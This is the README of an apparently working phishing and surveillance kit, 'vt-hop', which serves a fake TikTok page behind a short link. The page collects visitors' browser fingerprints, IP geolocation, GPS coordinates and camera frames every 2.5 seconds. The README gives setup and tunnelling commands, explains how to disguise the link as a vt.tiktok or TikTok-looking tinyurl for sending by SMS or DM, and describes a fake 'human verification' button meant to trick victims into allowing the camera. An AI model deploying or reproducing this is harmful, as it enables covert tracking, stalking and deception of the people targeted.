# vt-hop

TikTok-styled capture page behind a `/t/xxxx` short-link hop.
One click ships: full browser fingerprint, server-side IP geo enrichment, browser GPS coords, and camera frames every 2.5s.

## Run

```
npm install
npm start
```

Server listens on port 3000. Captures land in `captures\`:
- `clicks.log` — every hop click (IP, UA, referer)
- `recon.log` — fingerprint per visitor
- `geo_<ip>.json` — ISP/city/lat/lon from IP
- `*.jpg` + sidecar `.json` — camera frames with GPS coords
- `bye.log` — final beacon on tab close

## Expose it (HTTPS required — camera is blocked on http://)

Fastest, zero signup:

```
cloudflared tunnel --url http://localhost:3000
```

Grab the `https://xxxx.trycloudflare.com` URL it prints.

## Make it look like vt.tiktok

1. Shorten the tunnel URL: `https://vt.tiktok.com` style vanity needs a custom shortener (Short.io / your own domain) — free shorteners like tinyurl also work: `tinyurl.com/add-suffix` -> e.g. `tinyurl.com/tiktok_fyp_daily`
2. Send: `https://vt.tiktok.com/xxxx` style link or `tinyurl.com/<tiktokish>` via SMS/DM.

## Ops notes

- Camera prompt needs a user tap on the "Allow & Watch" button — that's the gate; the fake "human verification" makes it feel legit.
- No cam permission? Fingerprint + IP geo still ship silently.
- Frames keep flowing while the tab stays open. Keep the "video" playing on screen.
- Test locally with phone on same LAN: `http://<pc-ip>:3000` (cam won't fire on http — test cam through the tunnel).
